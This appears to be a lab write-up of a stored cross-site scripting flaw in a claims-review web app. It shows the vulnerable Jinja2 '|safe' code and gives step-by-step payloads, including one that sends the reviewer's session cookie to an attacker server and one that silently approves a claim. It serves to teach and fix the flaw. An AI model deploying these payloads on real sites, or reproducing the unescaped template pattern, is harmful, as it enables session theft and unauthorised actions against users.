# Privilege Escalation 1 — Stored XSS

**CWE:** [CWE-79](https://cwe.mitre.org/data/definitions/79.html) — Improper Neutralisation of Input During Web Page Generation ('Cross-site Scripting')

---

## Vulnerability Summary

Claim submission fields (`description` and `additional_details`) are stored directly in PostgreSQL **without any sanitisation**. When an OIC staff member opens a claim for review, these fields are rendered in the template using the Jinja2 `|safe` filter, which bypasses HTML escaping and allows injected JavaScript to execute in the reviewer's browser session.

### Vulnerable Code

**`app.py` — `/submit-claim` route (no sanitisation on input):**
```python
claim = Claim(
    user_id=current_user.id,
    claim_type_id=claim_type_id,
    title=title,
    description=description,            # stored as-is, no sanitisation
    amount=float(amount),
    additional_details=additional_details,  # stored as-is, no sanitisation
    status='pending'
)
```

**`templates/oic/review_claim.html` — rendered with `|safe`:**
```html
<div class="detail-value">{{ claim.description|safe }}</div>
...
<div class="detail-value">{{ claim.additional_details|safe }}</div>
```

---

## Exploitation Steps

### Step 1 — Log in as a normal staff user

```
Username: staff_user
Password: staff_pass
```

### Step 2 — Submit a claim with an XSS payload

Navigate to **Submit Claim** (`/submit-claim`). Select any claim type and fill in the form. In the **Description** field, enter a malicious JavaScript payload. Examples:

**Simple alert (proof of concept):**
```html
<script>alert('XSS - Stored in OIC session!');</script>
```

**Steal the OIC session cookie:**
```html
<script>
  new Image().src = 'http://ATTACKER_SERVER/steal?cookie=' + document.cookie;
</script>
```

**Auto-approve the attacker's own claim (privilege escalation):**
```html
<script>
  fetch('/claim/1/approve', {
    method: 'POST',
    headers: {'Content-Type': 'application/x-www-form-urlencoded'},
    body: 'action=approve&review_notes=Approved by XSS'
  });
</script>
```
> Replace `/claim/1/approve` with the actual claim ID path for the claim you want to approve.

### Step 3 — Wait for the OIC to review the claim

When the OIC staff member navigates to **Review Claims** and opens the malicious claim (`/oic/review-claim/<claim_id>`), the injected script executes in their authenticated session.

### Step 4 — Confirm the payload executed

- If using the alert payload: a JavaScript alert box appears in the OIC's browser.
- If using the cookie exfiltration payload: check the attacker server logs for the session cookie.
- If using the auto-approve payload: the claim status changes to `approved` without OIC action.

---

## Root Cause

1. No server-side input sanitisation when the claim is submitted (`app.py` stores raw HTML).
2. The Jinja2 `|safe` filter in `review_claim.html` disables output encoding, allowing raw HTML/JS to render in the browser.
